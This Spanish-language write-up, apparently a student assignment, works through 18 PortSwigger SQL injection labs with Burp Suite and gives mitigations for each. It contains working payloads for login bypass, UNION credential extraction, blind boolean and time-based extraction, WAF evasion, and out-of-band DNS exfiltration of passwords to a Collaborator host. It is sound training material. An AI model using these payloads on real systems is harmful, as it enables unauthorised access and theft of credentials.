SQL Injection

Análisis técnico y resolución de 18 laboratorios de SQL Injection — PortSwigger Web Security Academy

Contenido
Introducción Marco Teórico Desarrollo Práctico — 18 Laboratorios Conclusión Descargar Actividad

Introducción

SQL Injection es una de las vulnerabilidades más relevantes en el ámbito de la seguridad web, ya que permite alterar consultas hacia la base de datos mediante la manipulación de entradas no validadas correctamente. A través de este tipo de ataque, un atacante puede consultar información sensible, omitir mecanismos de autenticación, modificar registros e incluso comprometer por completo la confidencialidad e integridad de la aplicación.

El presente documento técnico tiene como finalidad documentar de manera estructurada la resolución de los laboratorios oficiales de SQL Injection de la plataforma PortSwigger Web Security Academy, empleando Burp Suite como herramienta principal para la interceptación, modificación y análisis de peticiones HTTP. A lo largo del desarrollo se presenta el fundamento teórico del ataque, la clasificación de sus variantes, el procedimiento práctico seguido en cada laboratorio, la explicación de los payloads utilizados y las medidas de mitigación recomendadas.

Este trabajo busca demostrar no solo la ejecución práctica de los laboratorios, sino también la comprensión técnica de la lógica detrás de cada explotación, el impacto de seguridad que representa una inyección SQL y la importancia de aplicar controles defensivos como consultas parametrizadas, validación de entradas y principios de mínimo privilegio.

Marco Teórico

Funcionamiento de Bases de Datos Relacionales

Las bases de datos relacionales son sistemas diseñados para almacenar, organizar y consultar información de manera estructurada mediante tablas. Cada tabla se compone de filas (registros) y columnas (atributos). El modelo relacional permite vincular tablas mediante claves primarias y claves foráneas. Para interactuar con ellas se utiliza SQL (Structured Query Language), que permite realizar operaciones como consultar, insertar, actualizar y eliminar datos.

Consultas SQL Básicas

Las instrucciones más relevantes para entender SQLi son:

  • SELECT columna FROM tabla — recupera datos de una o varias columnas.
  • WHERE condición — filtra resultados con base en criterios específicos.
  • UNION — combina resultados de dos consultas; ambas deben tener el mismo número de columnas y tipos compatibles.

¿Qué es SQL Injection?

SQL Injection ocurre cuando una aplicación web inserta directamente datos del usuario dentro de una consulta SQL sin aplicar validación o sanitización. El atacante puede modificar la estructura de la consulta original y ejecutar instrucciones no previstas, afectando los tres pilares de la seguridad: Confidencialidad (acceso a datos sensibles), Integridad (modificación de registros) y Disponibilidad (errores o caída del servicio).

Clasificación de Ataques SQLi

Tipo Subtipo Descripción
In-band Union-based Usa UNION para combinar consultas y mostrar datos en la misma respuesta HTTP.
Error-based Provoca errores controlados que revelan información en los mensajes del servidor.
Blind Boolean-based Envía condiciones verdaderas/falsas y observa diferencias en la respuesta (ej: mensaje "Welcome back").
Time-based Usa funciones de retardo (pg_sleep, SLEEP) para inferir datos según el tiempo de respuesta.
Out-of-band DNS/HTTP Extrae datos mediante canales externos como consultas DNS a un servidor controlado por el atacante.

Relación con OWASP Top 10

SQL Injection ha sido históricamente una de las vulnerabilidades más representativas del OWASP Top 10. Una sola inyección exitosa puede escalar a una afectación completa del sistema: evadir autenticaciones, comprometer cuentas administrativas y tomar control total de la lógica de la aplicación.

Principios de Defensa

  • Consultas parametrizadas / sentencias preparadas: separan estrictamente la estructura SQL de los datos del usuario.
  • Validación estricta de entradas: verificar longitud, formato y valores permitidos (lista blanca).
  • Principio de mínimo privilegio: la cuenta de BD de la aplicación solo debe tener los permisos estrictamente necesarios.
  • Manejo seguro de errores: nunca exponer mensajes de error internos del motor de base de datos.
  • Uso de ORM / frameworks seguros: abstraen el acceso directo a la BD e incorporan mecanismos de consultas parametrizadas.

Desarrollo Práctico — 18 Laboratorios

Todos los laboratorios fueron resueltos en la plataforma PortSwigger Web Security Academy usando Burp Suite como herramienta principal. Haz clic en cada laboratorio para expandir el procedimiento completo.

Lab 01 SQL injection in WHERE clause — hidden data retrieval
Apprentice In-band / WHERE

Objetivo

Explotar una vulnerabilidad de SQL Injection para recuperar todos los productos, incluyendo los no publicados, modificando la cláusula WHERE de la consulta.

Vulnerabilidad Técnica

La aplicación no filtra adecuadamente el parámetro category antes de incluirlo en la consulta SQL, permitiendo al atacante alterar la lógica original.

Procedimiento

  1. Iniciar el laboratorio y navegar a cualquier categoría de productos (ej: Pets) para observar que el filtro se aplica como parámetro URL: /filter?category=Pets
  2. Modificar directamente el parámetro en la URL inyectando el payload para cerrar la cadena y agregar una condición siempre verdadera: /filter?category=Pets'+OR+1=1--
  3. Verificar que la página devuelve todos los productos sin importar su estado de publicación.

Payload

filter?category=Pets' OR 1=1--

Explicación

  • ' — cierra la cadena de texto de la consulta original.
  • OR 1=1 — condición siempre verdadera que hace que la consulta devuelva todos los registros.
  • -- — comenta el resto de la consulta original para evitar errores de sintaxis.
Mitigación recomendada:

Usar consultas parametrizadas o sentencias preparadas. En lugar de concatenar la entrada del usuario, se utilizan marcadores de posición que el motor de BD trata estrictamente como datos literales.

Lab 02 SQL injection — login bypass
Apprentice In-band / Auth Bypass

Objetivo

Explotar una vulnerabilidad de SQL Injection para iniciar sesión como administrador sin conocer su contraseña.

Vulnerabilidad Técnica

La aplicación no filtra adecuadamente las credenciales antes de incluirlas en la consulta SQL de autenticación, permitiendo omitir la validación de contraseña.

Procedimiento

  1. Acceder al formulario de inicio de sesión del laboratorio.
  2. Abrir las herramientas de red del navegador para observar cómo se realiza la petición POST de login.
  3. En el campo de usuario ingresar: administrator'--
  4. En el campo de contraseña ingresar cualquier valor (será ignorado por el comentario SQL).
  5. Confirmar acceso como administrador.

Payload

Usuario: administrator'--
Contraseña: <cualquier valor>

Explicación

  • ' — cierra la cadena del campo usuario en la consulta SQL.
  • -- — comenta el resto de la consulta, eliminando la validación de contraseña. La consulta resultante es: SELECT * FROM users WHERE username='administrator'--' AND password='...'
Mitigación recomendada:

Implementar consultas parametrizadas. Los valores de usuario y contraseña deben enviarse como parámetros separados y nunca concatenarse directamente en la cadena SQL.

Lab 03 UNION attack — database type and version on Oracle
Practitioner UNION-based / Oracle

Objetivo

Explotar una vulnerabilidad UNION para obtener la versión del motor de base de datos Oracle.

Vulnerabilidad Técnica

El parámetro category se inserta directamente en la consulta SQL. Oracle expone la información de versión en la vista del sistema v$version, columna BANNER.

Procedimiento

  1. Acceder a cualquier categoría del laboratorio y observar que la respuesta muestra 2 columnas de datos.
  2. Construir un payload UNION que consulte la columna BANNER de v$version con un NULL de relleno para la segunda columna.
  3. Inyectar el payload en el parámetro category.

Payload

/filter?category=' UNION SELECT BANNER, NULL FROM v$version--

Explicación

  • ' — cierra la cadena original.
  • UNION SELECT — combina resultados de la consulta original con la inyectada.
  • BANNER — columna de Oracle con la descripción de versión del motor.
  • NULL — relleno para coincidir con el número de columnas de la consulta original.
  • FROM v$version — vista del sistema Oracle con información de versión.
  • -- — comenta el resto de la consulta.
Mitigación recomendada:

Consultas parametrizadas. Adicionalmente, configurar el servidor para no devolver mensajes de error detallados ni información de versión en las respuestas de la aplicación.

Lab 04 UNION attack — database type and version on MySQL/Microsoft
Practitioner UNION-based / MySQL

Objetivo

Explotar UNION para obtener la versión del servidor MySQL/Microsoft SQL Server mediante la variable @@version.

Vulnerabilidad Técnica

El parámetro category se inserta en la consulta sin validación. A diferencia de Oracle, MySQL/MSSQL exponen su versión mediante la variable de sistema @@version.

Procedimiento

  1. Abrir el laboratorio en el navegador integrado de Burp Suite e interceptar la petición al filtrar por la categoría Pets.
  2. Enviar la petición al módulo Repeater para manipularla manualmente.
  3. Determinar el número de columnas probando ORDER BY 1, ORDER BY 2, ORDER BY 3 hasta obtener un error 500 (indica que se superó el número de columnas). El error ocurre en 3, por lo tanto hay 2 columnas.
  4. Verificar qué columna acepta texto probando UNION SELECT 'abc', NULL-- y luego UNION SELECT NULL, 'abc'--.
  5. Inyectar @@version en la columna de texto identificada.

Payload

/filter?category=Pets' UNION SELECT NULL,@@version--

Explicación

  • Pets' — cierra la cadena original.
  • UNION SELECT — combina resultados.
  • NULL — primera columna numérica, no acepta texto.
  • @@version — variable de sistema que devuelve la versión del servidor en MySQL y MSSQL.
  • -- — comenta el resto de la consulta.
Mitigación recomendada:

Consultas parametrizadas, validación estricta de entradas, principio de menor privilegio en la base de datos y uso de ORM con sentencias preparadas.

Lab 05 UNION attack — listing database contents (non-Oracle)
Practitioner UNION-based / Enumeración

Objetivo

Usar UNION para enumerar tablas, columnas, extraer credenciales e iniciar sesión como administrador.

Vulnerabilidad Técnica

El parámetro category no está sanitizado. En bases de datos no-Oracle, el esquema information_schema expone la estructura interna (tablas, columnas) que puede ser consultada para enumerar y extraer datos sensibles.

Procedimiento

  1. Interceptar la petición al seleccionar la categoría Lifestyle y enviarla a Repeater.
  2. Confirmar 2 columnas de texto con: ' UNION SELECT 'a','b'--
  3. Listar todas las tablas de la base de datos consultando information_schema.tables.
  4. Identificar la tabla de usuarios (ej: users_xpjxxo) y consultar sus columnas desde information_schema.columns.
  5. Extraer usuarios y contraseñas desde la tabla identificada.
  6. Copiar la contraseña del usuario administrator e iniciar sesión en My Account.

Payloads utilizados

# 1. Listar tablas
' UNION SELECT table_name, NULL FROM information_schema.tables--

# 2. Listar columnas de la tabla de usuarios
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_xpjxxo'--

# 3. Extraer credenciales
' UNION SELECT username_utpasc, password_spjiov FROM users_xpjxxo--

Explicación

  • Lifestyle' — cierra la cadena original.
  • information_schema.tables / columns — vistas del sistema que exponen la estructura de la BD.
  • username_utpasc, password_spjiov — nombres de columna obtenidos en el paso de enumeración.
  • FROM users_xpjxxo — tabla de credenciales identificada en el paso anterior.
  • -- — comenta el resto de la consulta.
Mitigación recomendada:

Consultas parametrizadas, principio de menor privilegio (la cuenta de BD de la app no debería tener acceso a information_schema), validación de entradas y uso de ORM seguro.

Lab 06 UNION attack — listing database contents on Oracle
Practitioner UNION-based / Oracle

Objetivo

Enumerar la estructura de una BD Oracle usando all_tables / all_tab_columns, extraer credenciales e iniciar sesión como administrador.

Vulnerabilidad Técnica

En Oracle no existe information_schema. La enumeración se realiza mediante las vistas del sistema all_tables (listado de tablas) y all_tab_columns (columnas por tabla). Oracle también requiere que toda consulta SELECT incluya una cláusula FROM, por lo que se usa la tabla especial dual para consultas sin tabla origen.

Procedimiento

  1. Interceptar la petición al seleccionar Food & Drinks y enviarla a Repeater.
  2. Confirmar inyección y número de columnas con: ' UNION SELECT 'a','b' FROM dual--
  3. Listar tablas con: ' UNION SELECT table_name, NULL FROM all_tables-- y buscar la tabla de usuarios.
  4. Obtener columnas con: ' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='USERS_ABC'--
  5. Extraer credenciales y hacer login como administrador.

Payload final

' UNION SELECT USERNAME_ABC, PASSWORD_ABC FROM USERS_ABC123--

Explicación

  • Food & Drinks' — cierra la cadena original.
  • all_tables / all_tab_columns — vistas del sistema Oracle equivalentes a information_schema.
  • dual — tabla especial de Oracle usada cuando no se requiere una tabla real como fuente.
  • USERNAME_ABC, PASSWORD_ABC — columnas encontradas en el paso de enumeración.
  • -- — comenta el resto de la consulta.
Mitigación recomendada:

Consultas parametrizadas, validación de entradas, principio de menor privilegio y uso de frameworks que gestionen automáticamente las sentencias preparadas.

Lab 07 UNION attack — determining number of columns
Practitioner UNION-based / Reconocimiento

Objetivo

Determinar el número exacto de columnas que devuelve la consulta SQL original, requisito indispensable para cualquier ataque UNION exitoso.

Vulnerabilidad Técnica

El backend concatena directamente el valor del filtro category en la consulta SQL. Al no sanitizar la entrada, el motor no puede distinguir entre datos legítimos e instrucciones maliciosas. El operador UNION requiere que ambas consultas devuelvan el mismo número de columnas; descubrir este número es el primer paso de reconocimiento.

Procedimiento

  1. Abrir Burp Suite, activar el proxy y navegar al laboratorio.
  2. Hacer clic en la categoría Food & Drink para generar una petición GET con el parámetro category.
  3. Capturar la petición y enviarla al módulo Repeater.
  4. Verificar la línea base enviando la petición original: debe devolver 200 OK.
  5. Probar con un NULL: ' UNION SELECT NULL-- → respuesta 500 (una columna no es suficiente).
  6. Agregar un segundo NULL: ' UNION SELECT NULL,NULL-- → sigue con 500.
  7. Agregar un tercer NULL: ' UNION SELECT NULL,NULL,NULL-- → respuesta 200 OK. La consulta tiene 3 columnas.

Payloads probados

' UNION SELECT NULL--            → 500 Error (1 columna insuficiente)
' UNION SELECT NULL,NULL--       → 500 Error (2 columnas insuficiente)
' UNION SELECT NULL,NULL,NULL--  → 200 OK   ✓ (3 columnas confirmadas)

Explicación

  • ' — rompe la consulta original.
  • UNION SELECT — intenta fusionar una nueva consulta.
  • NULL — comodín universal compatible con cualquier tipo de dato; evita errores de tipo mientras se averigua el número de columnas.
  • -- — comenta el resto del código original.
Mitigación recomendada:

Consultas parametrizadas. Con este método la estructura SQL se pre-compila y los datos se envían por un canal separado; sin importar qué inyecte el atacante, la BD siempre lo tratará como dato literal.

Lab 08 UNION attack — finding a column containing text
Practitioner UNION-based / Tipo de dato

Objetivo

Identificar qué columna de la consulta original acepta datos de tipo texto, paso previo a la extracción de información.

Vulnerabilidad Técnica

UNION requiere que los tipos de datos sean compatibles por posición. Si una columna es numérica e intentamos inyectar texto, el motor genera un error de conversión de tipo (HTTP 500). Probamos cada posición sistemáticamente hasta encontrar una columna de tipo texto (VARCHAR/TEXT).

Procedimiento

  1. Acceder al laboratorio y anotar la cadena aleatoria que el lab pide inyectar (ej: QAAUcU).
  2. Interceptar la petición al filtrar por Accessories y enviarla a Repeater.
  3. Confirmar la línea base con la petición original (200 OK).
  4. Confirmar 3 columnas con: ' UNION SELECT NULL,NULL,NULL-- → 200 OK.
  5. Probar texto en la columna 1: ' UNION SELECT 'abc',NULL,NULL-- → 500 (columna numérica).
  6. Probar texto en la columna 2: ' UNION SELECT NULL,'abc',NULL-- → 200 OK ✓ (acepta texto).
  7. Inyectar la cadena solicitada por el lab: ' UNION SELECT NULL,'QAAUcU',NULL--

Payload

' UNION SELECT NULL,'QAAUcU',NULL--

Explicación

  • NULL — se usa en las posiciones no evaluadas; es compatible con cualquier tipo de dato.
  • 'abc' — cadena de texto literal usada para sondear la compatibilidad de tipo de cada columna.
  • Un 200 OK al colocar texto en una posición confirma que esa columna es de tipo cadena.
  • Un 500 indica que la columna es numérica y rechaza la cadena.
Mitigación recomendada:

Validación de entrada con lista blanca (Whitelisting): el parámetro category solo debería aceptar valores predefinidos como "Accessories", "Food & Drink" o "Gifts". Cualquier otro valor debe ser rechazado antes de llegar a la BD.

Lab 09 UNION attack — retrieving data from other tables
Practitioner UNION-based / Extracción

Objetivo

Extraer todos los usuarios y contraseñas de la tabla users e iniciar sesión como administrador.

Vulnerabilidad Técnica

El parámetro category no está sanitizado y la cuenta de BD de la aplicación tiene permisos de lectura sobre la tabla users. Esta falta de segmentación permite cruzar la consulta de productos hacia la tabla de credenciales mediante un UNION.

Procedimiento

  1. Interceptar la petición al filtrar por Pets y enviarla a Repeater.
  2. Confirmar la línea base (200 OK).
  3. Verificar que ambas columnas aceptan texto: ' UNION SELECT 'abc','def'-- → 200 OK.
  4. Inyectar el payload definitivo para extraer todas las credenciales de la tabla users.
  5. En el panel Render del Repeater, localizar la contraseña del usuario administrator.
  6. Deshabilitar el intercept en Burp y hacer login en My Account con las credenciales obtenidas.

Payload

' UNION SELECT username, password FROM users--

Explicación

  • ' — rompe la consulta de productos.
  • UNION SELECT username, password — fusiona los resultados con las columnas de credenciales.
  • FROM users — redirige la consulta a la tabla de usuarios (fuera del scope original de la consulta).
  • -- — comenta el resto. El servidor renderiza las credenciales como si fueran nombres de productos.
Mitigación recomendada:

Principio de Menor Privilegio: la cuenta de BD que muestra productos jamás debería tener SELECT sobre la tabla de contraseñas. Consultas Parametrizadas: prevenir que la entrada se interprete como código SQL.

Lab 10 UNION attack — retrieving multiple values in a single column
Practitioner UNION-based / Concatenación

Objetivo

Extraer usuario y contraseña concatenados en una sola columna cuando solo una de las columnas disponibles acepta texto.

Vulnerabilidad Técnica

La consulta tiene 2 columnas pero solo la segunda acepta texto. Para extraer dos campos (usuario y contraseña) en ese único espacio disponible, se utiliza el operador de concatenación || de PostgreSQL/Oracle para unirlos en una sola cadena separada por un carácter delimitador.

Procedimiento

  1. Interceptar la petición al filtrar por Pets y enviarla a Repeater.
  2. Confirmar número de columnas con ORDER BY (error en 3 → 2 columnas).
  3. Probar qué columna acepta texto: la primera da error con texto, la segunda funciona (' UNION SELECT null,'i'--).
  4. Concatenar usuario y contraseña en la columna de texto usando el operador || con un delimitador (*) para distinguirlos.
  5. Copiar las credenciales del administrador e iniciar sesión.

Payload

' UNION SELECT null, username||'*'||password FROM users--

Explicación

  • null — primera columna numérica, no acepta texto.
  • username||'*'||password — concatena usuario, delimitador y contraseña en la columna de texto disponible.
  • '*' — separador visual para distinguir usuario de contraseña en la salida.
  • FROM users — tabla de credenciales.
Mitigación recomendada:

Consultas parametrizadas. Aunque solo una columna acepte texto, la concatenación de campos sensibles sigue siendo posible si hay inyección. El único remedio definitivo es separar datos del código SQL.

Lab 11 Blind SQLi with conditional responses
Practitioner Blind / Boolean-based

Objetivo

Extraer la contraseña del administrador carácter por carácter usando el mensaje "Welcome back!" como oráculo booleano (aparece si la condición es verdadera, desaparece si es falsa).

Vulnerabilidad Técnica

La vulnerabilidad está en la cookie de rastreo TrackingId. La aplicación ejecuta una consulta SQL con su valor y muestra "Welcome back!" si retorna resultados. Al inyectar condiciones lógicas en la cookie, el atacante puede hacer preguntas binarias a la BD y extraer información carácter por carácter.

Procedimiento

  1. Interceptar cualquier petición con Burp y enviarla a Repeater. Identificar la cookie TrackingId.
  2. Verificar que la tabla users existe: ' AND (SELECT 'a' FROM users LIMIT 1)='a'-- → "Welcome back!" aparece.
  3. Confirmar que el usuario administrator existe: ' AND (SELECT username FROM users WHERE username='administrator')='administrator'--
  4. Determinar la longitud de la contraseña incrementando el valor hasta que "Welcome back!" desaparezca. La longitud encontrada es 20 caracteres.
  5. Configurar Burp Intruder con ataque tipo Cluster Bomb: primera variable = posición (1-20), segunda variable = carácter (a-z, 0-9).
  6. Analizar resultados filtrando por tamaño de respuesta. Los de mayor tamaño indican coincidencia. Contraseña obtenida: nb7y5tthvmmspwhxnt36

Payloads clave

# Verificar tabla
' AND (SELECT 'a' FROM users LIMIT 1)='a'--

# Verificar longitud
' AND (SELECT username FROM users WHERE username='administrator' AND LENGTH(password)>19)='administrator'--

# Extraer carácter por carácter
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'--
Mitigación recomendada:

Consultas parametrizadas para que los valores de cookies no sean código SQL. No devolver respuestas diferenciadas basadas en el resultado de consultas internas (evitar oráculo booleano).

Lab 12 Blind SQLi with conditional errors (Oracle)
Practitioner Blind / Error-based

Objetivo

Extraer la contraseña del administrador usando errores HTTP 500 (condición verdadera = división por cero) como canal de información en lugar de respuestas visuales.

Vulnerabilidad Técnica

La cookie TrackingId se usa en una consulta SQL Oracle sin validación. Al inyectar una expresión CASE WHEN con TO_CHAR(1/0), si la condición es verdadera se provoca un error 500; si es falsa, responde 200. Esto permite inferir datos bit a bit.

Procedimiento

  1. Inyectar ' en la cookie → respuesta 500 (confirma la vulnerabilidad).
  2. Construir una consulta Oracle válida que dé 200: usar concatenación || en lugar de AND.
  3. Verificar que la tabla users existe: '||(SELECT ' ' FROM users WHERE rownum=1)||'
  4. Confirmar existencia del administrador con CASE WHEN → error 500 si existe.
  5. Determinar longitud de contraseña: error 500 para valores menores a la longitud real. Longitud: 20 caracteres.
  6. Enviar al Intruder con ataque Cluster Bomb para extraer cada carácter. Contraseña: a7qonpzm95ubeh8uf8a7

Payload clave

'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' AND LENGTH(password)>1)||'

Explicación

  • '||...||' — concatenación Oracle para insertar la expresión dentro del valor de la cookie.
  • CASE WHEN ... THEN TO_CHAR(1/0) — si la condición es verdadera, ejecuta división por cero → error 500.
  • ELSE '' — si es falsa, retorna cadena vacía → respuesta 200.
  • LENGTH(password)>N — sondeo binario para determinar la longitud.
Mitigación recomendada:

Consultas parametrizadas para la cookie. Validación estricta de entrada (la cookie solo debería contener caracteres alfanuméricos). Deshabilitar mensajes de error detallados en producción.

Lab Solved
Lab 13 Visible error-based SQL injection
Practitioner Error-based / CAST

Objetivo

Extraer la contraseña del administrador aprovechando que el servidor muestra mensajes de error detallados que incluyen el valor de la expresión fallida.

Vulnerabilidad Técnica

La cookie TrackingId se inserta en una consulta SQL PostgreSQL sin sanitización. El servidor está mal configurado para mostrar errores internos al usuario. Al intentar convertir un texto (contraseña) a un entero con CAST(... AS int), PostgreSQL falla e incluye el valor original del texto en el mensaje de error, exponiéndolo directamente al atacante.

Procedimiento

  1. Configurar Burp Suite como proxy e interceptar la petición GET de la tienda.
  2. Enviar la petición al Repeater e identificar la cookie TrackingId.
  3. Inyectar ' en la cookie → respuesta 500 (confirma vulnerabilidad).
  4. Inyectar el payload CAST con una subconsulta que extraiga la contraseña del administrador.
  5. El mensaje de error de PostgreSQL mostrará: "invalid input syntax for integer: <contraseña>", exponiendo el valor buscado.
  6. Copiar la contraseña del mensaje de error e iniciar sesión como administrador.

Payload

' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--

Explicación

  • ' — cierra la cadena original de la cookie.
  • AND 1= — introduce una comparación booleana que obliga a evaluar la expresión.
  • CAST(... AS int) — intenta convertir la contraseña (texto) a entero; falla y el mensaje de error incluye el valor original.
  • SELECT password FROM users LIMIT 1 — selecciona la contraseña; LIMIT 1 asegura una sola fila para evitar error de cardinalidad.
  • -- — comenta el resto de la consulta.
Mitigación recomendada:

Deshabilitar la visualización de errores detallados en producción (error_reporting off). Utilizar consultas parametrizadas para que la cookie sea tratada como dato literal.

Lab 14 Blind SQLi with time delays
Practitioner Blind / Time-based

Objetivo

Confirmar la vulnerabilidad de inyección SQL logrando que la aplicación pause su respuesta exactamente 10 segundos mediante la función pg_sleep de PostgreSQL.

Vulnerabilidad Técnica

La aplicación no muestra errores ni cambia su contenido según la consulta. Sin embargo, si se inyecta una función que detiene la ejecución del motor (pg_sleep en PostgreSQL), el tiempo de respuesta HTTP sirve como canal de confirmación. Si la respuesta tarda N segundos, el código fue ejecutado.

Procedimiento

  1. Interceptar la petición GET e identificar la cookie TrackingId.
  2. Enviarla al Repeater y establecer la línea base (respuesta inmediata, 200 OK).
  3. Inyectar el payload de retardo en la cookie: x'||pg_sleep(10)--
  4. Enviar la petición y verificar que el servidor tarda ≥10,000 ms en responder, confirmando que la función fue ejecutada.

Payload

x'||pg_sleep(10)--

Explicación

  • x' — cierra la cadena original de la cookie con un valor de relleno.
  • || — operador de concatenación de PostgreSQL para encadenar la función.
  • pg_sleep(10) — función nativa de PostgreSQL que detiene la ejecución 10 segundos.
  • -- — comenta el código posterior para evitar errores de sintaxis.
Mitigación recomendada:

Validación estricta de la cookie (solo caracteres alfanuméricos esperados). WAF configurado para detectar palabras clave de funciones de tiempo (sleep, pg_sleep, benchmark). Consultas parametrizadas como defensa primaria.

Lab 15 Blind SQLi with time delays and information retrieval
Practitioner Blind / Time-based + Extracción

Objetivo

Extraer la contraseña del administrador carácter por carácter usando el tiempo de respuesta como único canal de información.

Vulnerabilidad Técnica

Combina retardo de tiempo con lógica condicional CASE WHEN. La BD responde a la pregunta: "Si el carácter en posición N es X, espera 10 segundos; si no, responde inmediatamente". Analizando el tiempo de respuesta para cada combinación posición/carácter, se reconstruye la contraseña completa sin visibilidad directa.

Procedimiento

  1. Verificar que pg_sleep funciona en la cookie TrackingId.
  2. Determinar la longitud de la contraseña con: AND (SELECT CASE WHEN (username='administrator' AND LENGTH(password)>X) THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users)='a'
  3. Configurar Burp Intruder con ataque Cluster Bomb: Payload 1 = posiciones (1–20), Payload 2 = caracteres (a-z, 0-9).
  4. Analizar la columna "Response received" en el Intruder: las peticiones con mayor tiempo de respuesta indican el carácter correcto para esa posición.
  5. Reconstruir la contraseña completa y hacer login.

Payload de extracción

'%3BSELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--

Explicación

  • CASE WHEN ... THEN pg_sleep(10) ELSE pg_sleep(0) END — lógica condicional que controla el retardo según si el carácter coincide.
  • SUBSTRING(password,1,1)='a' — extrae un carácter específico y lo compara con el valor de prueba.
  • FROM users WHERE username='administrator' — limita la consulta al registro del administrador.
Mitigación recomendada:

Consultas parametrizadas. Rate Limiting (limitar peticiones por IP) para bloquear el ataque automatizado que requiere cientos de peticiones. Validación de cookies.

Lab 16 Blind SQLi with out-of-band interaction
Practitioner Out-of-Band / DNS

Objetivo

Confirmar la vulnerabilidad provocando que el servidor de BD realice una consulta DNS hacia el dominio generado por Burp Collaborator.

Vulnerabilidad Técnica

La aplicación no muestra errores, ni cambios en contenido, ni diferencias temporales. Sin embargo, la cookie TrackingId se inserta en una consulta SQL sin validación. La técnica Out-of-Band aprovecha funciones del motor de BD que permiten conexiones externas (consultas DNS/HTTP). Al forzar una resolución DNS hacia un dominio controlado, el atacante confirma la ejecución del payload desde el servidor de Burp Collaborator.

Procedimiento

  1. Abrir Burp Collaborator Client y copiar el dominio único generado.
  2. Interceptar la petición del laboratorio y enviarla a Repeater.
  3. Intentar técnicas comunes (UNION, booleanas) → sin respuesta visible (Blind confirmado).
  4. Construir un payload Oracle que fuerce una consulta DNS al dominio de Collaborator usando UTL_INADDR.GET_HOST_ADDRESS o similar.
  5. Aplicar URL encoding al dominio de Collaborator antes de enviar.
  6. Presionar Pull Now en Burp Collaborator y verificar la interacción DNS registrada.

Estructura del Payload (conceptual)

'||(SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://DOMINIO-COLLABORATOR/"> %remote;]>'),'/l') FROM dual)||'

Explicación

  • '||...||' — concatenación Oracle para insertar la expresión en la cookie.
  • La subconsulta fuerza al servidor de BD a intentar resolver el dominio de Burp Collaborator.
  • La interacción DNS registrada en Collaborator confirma la ejecución del payload.
  • -- — comenta el resto de la consulta.
Mitigación recomendada:

Consultas parametrizadas. Restricción de conexiones externas desde el servidor de BD (reglas de firewall que bloqueen DNS y HTTP salientes). Validación de cookies. Principio de menor privilegio.

Lab 17 Blind SQLi with out-of-band data exfiltration
Practitioner Out-of-Band / Exfiltración

Objetivo

Extraer la contraseña del administrador enviándola como parte de una consulta DNS hacia el dominio de Burp Collaborator, donde quedará registrada como subdominio.

Vulnerabilidad Técnica

La cookie TrackingId es vulnerable en una BD Oracle. Como no hay retroalimentación directa, la contraseña se concatena dentro de un subdominio del dominio de Collaborator. Cuando Oracle intenta resolver ese dominio (que incluye la contraseña como prefijo), la solicitud DNS queda registrada en Collaborator con la contraseña visible en el subdominio.

Procedimiento

  1. Abrir Burp Collaborator Client y copiar el dominio único.
  2. Interceptar la petición e identificar la cookie TrackingId.
  3. Construir el payload que concatena la contraseña del administrador como prefijo del dominio de Collaborator.
  4. Aplicar URL encoding al payload y enviarlo desde el Repeater.
  5. Presionar Pull Now en Collaborator → la contraseña aparece en el subdominio de la consulta DNS registrada.
  6. Si la contraseña aparece unida al dominio, añadir un punto (.) de separación en el payload y repetir.
  7. Copiar la contraseña e iniciar sesión como administrador.

Estructura del Payload (conceptual)

'||(SELECT EXTRACTVALUE(xmltype('...'),'/l') FROM (SELECT password FROM users WHERE username='administrator') WHERE ROWNUM=1)||'

Explicación

  • La contraseña se obtiene de la tabla users y se concatena como subdominio del dominio Collaborator.
  • La BD Oracle intenta resolver el DNS [contraseña].dominio-collaborator.
  • Collaborator registra la consulta DNS y el subdominio revela la contraseña exfiltrada.
Mitigación recomendada:

Consultas parametrizadas. Firewall que bloquee conexiones DNS/HTTP salientes desde el servidor de BD. Validación de entradas. Principio de menor privilegio en la cuenta de BD.

Lab 18 SQL injection with filter bypass via XML encoding
Practitioner WAF Bypass / XML Encoding

Objetivo

Evadir el WAF que protege la funcionalidad de consulta de stock codificando el payload en entidades hexadecimales XML, extraer credenciales e iniciar sesión como administrador.

Vulnerabilidad Técnica

La funcionalidad Check Stock inserta los parámetros productId y storeId en una consulta SQL sin validación. Existe un WAF que bloquea patrones de SQLi en texto plano (comillas, UNION, SELECT). Sin embargo, el WAF solo analiza texto plano: al codificar el payload con entidades hexadecimales XML, el WAF no reconoce el patrón y lo deja pasar. El servidor decodifica las entidades antes de ejecutar la consulta, logrando la inyección.

Procedimiento

  1. Explorar la tienda y hacer clic en Check Stock en cualquier producto para generar la petición XML.
  2. Interceptar la petición con Burp e identificar los parámetros productId y storeId.
  3. Enviar a Repeater y verificar la línea base.
  4. Intentar inyectar ' en storeId → respuesta "Attack detected" (WAF activo).
  5. Instalar la extensión Hackvertor desde BApp Store en Burp Suite.
  6. Seleccionar el payload, hacer clic derecho → Extensions → Hackvertor → Encode → Hex entities para convertirlo a entidades hexadecimales XML.
  7. Enviar el payload codificado → el WAF no lo detecta y el servidor lo procesa normalmente.
  8. Determinar que la consulta tiene 1 columna con UNION SELECT NULL.
  9. Extraer credenciales concatenadas con ||':'|| e iniciar sesión como administrador.

Payload (antes de codificar)

UNION SELECT username||':'||password FROM users

Explicación

  • Hackvertor convierte el payload a entidades hexadecimales XML (ej: &#x55;&#x4e;&#x49;...) que el WAF no reconoce como patrón de SQLi.
  • El servidor XML decodifica las entidades antes de ejecutar la consulta → inyección exitosa.
  • username||':'||password — concatena ambas columnas en la única disponible usando el delimitador :.
  • FROM users — tabla de credenciales.
Mitigación recomendada:

Consultas parametrizadas (defensa primaria). Actualización constante del WAF para detectar técnicas de evasión por encoding. Validación de entradas. Principio de menor privilegio en la BD.

Lab Solved

Conclusión

